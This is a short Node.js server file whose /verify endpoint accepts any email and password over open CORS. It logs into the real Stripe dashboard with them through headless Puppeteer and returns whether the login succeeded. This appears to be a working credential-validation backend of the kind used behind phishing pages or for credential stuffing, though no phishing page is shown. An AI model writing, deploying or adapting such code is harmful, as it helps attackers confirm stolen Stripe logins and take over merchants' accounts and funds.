const puppeteer = require("puppeteer");
require("dotenv").config();
const express = require("express");
const cors = require("cors");
const bodyParser = require("body-parser");
const app = express()
const PORT = process.env.PORT || 3000
let jsonParser = bodyParser.json();
app.use(cors());


app.get("/", (re, res) => {
   res.send("Hello Server.js")
});


app.post("/verify", jsonParser, (req, res) => {
const {email, password} = req.body;
(async () => {
  const browser = await puppeteer.launch({args:["--no-sandbox", "--disable-setuid-sandbox", "--single-process", "--no-zygote"] , executablePath: process.env.NODE_ENV === "production" ? process.env.PUPPETEER_EXECUTABLE_PATH : puppeteer.executablePath(), headless: "new"});
  const [page] = await browser.pages();
  await page.goto('https://dashboard.stripe.com/login');
  await page.locator("#email").fill(email)
  await page.locator("#old-password").fill(password)
  await page.locator('body > div.db-Login-root.db-Login-root--v4 > div > div > div.db-RegisterAndLoginLayout.db-RegisterAndLoginLayout--login.db-RegisterAndLoginLayout--isMobile.Box-root.Flex-flex.Flex-direction--column > div.db-RegisterAndLoginLayout-contentWrapper.Box-root > div > div.Card-root.Card--radius--all.Card--shadow--large.db-RegisterAndLoginLayout-card.Box-root.Box-hideIfEmpty.Box-background--white > div > div > div > div > div > div > div:nth-child(2) > form > div > div > div > div:nth-child(4) > div > div > div > div > div > div.PressableCore-base.Box-root > button').click()
  await page.waitForSelector('.Text-color--red', {timeout: 3000}).then(() => {
    res.setHeader('Content-Type', 'application/json');
    res.send(JSON.stringify({msg: 'Incorrect email or password'}));
  }).catch(() => {
   res.send(JSON.stringify({msg: 'Success'}))
  })
  await page.close();
})();
})  


app.listen(PORT, () => {
  console.log(`app listening on port ${PORT}`)
})
